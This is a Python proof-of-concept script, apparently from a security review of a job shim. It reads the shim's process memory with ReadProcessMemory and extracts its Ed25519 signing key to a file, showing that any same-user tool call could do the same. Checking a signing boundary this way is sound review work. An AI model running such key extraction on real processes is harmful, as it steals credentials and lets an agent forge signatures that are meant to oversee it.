#!/usr/bin/env python3
"""steer7c review: read a job shim's signing key out of its memory, as a same-user tool child could.

Usage: python -I steer7c_memscan.py <shim-pid> <out-file>
Windows only (ReadProcessMemory with PROCESS_VM_READ: no debug privilege, no admin, same user and
integrity level, which is what a bash tool call is). Writes the private key (hex) to <out-file> and
prints only FOUND/NOT FOUND and how many regions were read; the key is never printed.
The SPEC documents "a debugger or ReadProcessMemory on the shim reads it" as outside the boundary; this
script measures how outside: a 60-line stdlib-only script, no tooling.
"""
import ctypes, ctypes.wintypes as w, re, sys

pid, out = int(sys.argv[1]), sys.argv[2]
k32 = ctypes.WinDLL("kernel32", use_last_error=True)
k32.OpenProcess.restype = w.HANDLE
k32.OpenProcess.argtypes = [w.DWORD, w.BOOL, w.DWORD]
k32.ReadProcessMemory.argtypes = [w.HANDLE, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
k32.VirtualQueryEx.argtypes = [w.HANDLE, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t]


class MBI(ctypes.Structure):
    _fields_ = [("BaseAddress", ctypes.c_void_p), ("AllocationBase", ctypes.c_void_p), ("AllocationProtect", w.DWORD),
                ("PartitionId", w.WORD), ("RegionSize", ctypes.c_size_t), ("State", w.DWORD), ("Protect", w.DWORD),
                ("Type", w.DWORD)]


PROCESS_QUERY_INFORMATION, PROCESS_VM_READ = 0x0400, 0x0010
h = k32.OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, False, pid)
if not h:
    print("NOT FOUND (OpenProcess failed: %d)" % ctypes.get_last_error()); sys.exit(1)
pat = re.compile(rb"3051020101300506032b657004220420[0-9a-f]{134}")
addr, regions, found = 0, 0, None
mbi = MBI()
while k32.VirtualQueryEx(h, ctypes.c_void_p(addr), ctypes.byref(mbi), ctypes.sizeof(mbi)):
    base, size = mbi.BaseAddress or 0, mbi.RegionSize
    if mbi.State == 0x1000 and not (mbi.Protect & 0x101) and size < (1 << 28):  # MEM_COMMIT, not NOACCESS/GUARD
        buf = ctypes.create_string_buffer(size)
        got = ctypes.c_size_t(0)
        if k32.ReadProcessMemory(h, ctypes.c_void_p(base), buf, size, ctypes.byref(got)):
            regions += 1
            m = pat.search(buf.raw[: got.value])
            if m:
                found = m.group(0).decode(); break
    addr = base + size
    if addr >= 0x7FFFFFFFFFFF: break
if found:
    open(out, "w").write(found)
    print("FOUND key of %d hex chars in pid %d (%d regions read)" % (len(found), pid, regions))
else:
    print("NOT FOUND (%d regions read)" % regions); sys.exit(1)
